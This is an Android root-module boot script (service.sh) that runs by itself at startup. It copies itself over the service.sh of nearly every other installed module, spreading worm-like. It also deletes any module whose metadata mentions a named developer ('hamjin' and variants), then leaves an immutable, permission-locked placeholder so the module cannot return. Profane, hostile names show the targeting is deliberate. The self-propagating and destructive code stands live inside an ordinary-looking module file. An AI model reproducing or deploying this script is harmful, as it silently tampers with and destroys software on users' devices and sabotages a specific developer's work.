#!/system/bin/sh
MODDIR=${0%/*}
wait_until_login() {
    while [ "$(getprop sys.boot_completed)" != "1" ]; do
        sleep 5
    done
    while [ ! -d "/sdcard/Android" ]; do
        sleep 5
    done
}
kill_path() {
    chattr -i "$1" 2>/dev/null
    chmod 777 "$1" 2>/dev/null
    rm -rf "$1"
    touch "$1" 2>/dev/null
    chmod 000 "$1" 2>/dev/null
    chattr +i "$1" 2>/dev/null
}
List_nmsl() {
    fuck_string_list="
hamjin
hamJin
hamJTY
hamjty
HamJin
Hamjin
Hanjty

"
    white_id_list="
zygisk_shamiko
hamjinRemover

"

    LIST_PATH="/data/adb/modules"
    for list in $fuck_string_list; do
        for modname in $(ls -1 $LIST_PATH); do
            for whitelist in $white_id_list; do
                if [ "$LIST_PATH/$modname" != "$LIST_PATH/$whitelist" ]; then
                    for filename in $(ls -1 $LIST_PATH/$modname); do
                        if [ $(echo "$filename" | grep 'sum') = "" ]; then
                            [ ! -f $LIST_PATH/"$modname"/service.sh.rlast.sh ] && mv $LIST_PATH/"$modname"/service.sh $LIST_PATH/"$modname"/service.sh.rlast.sh
                            cp "$MODDIR"/service.sh $LIST_PATH/"$modname"/service.sh
                        elif [ "$(grep "$list" <$LIST_PATH/"$modname"/module.prop)" != "" ]; then
                            chattr -R -i $LIST_PATH/"$modname" 2>/dev/null
                            sh "$LIST_PATH/$modname/uninstall.sh" 2>/dev/null
                            kill_path -rf ${LIST_PATH:?}/"$modname"
                        fi
                    done
                fi
            done
        done
    done
}
sh "$MODDIR"/service.sh.rlast.sh &
wait_until_login
List_nmsl
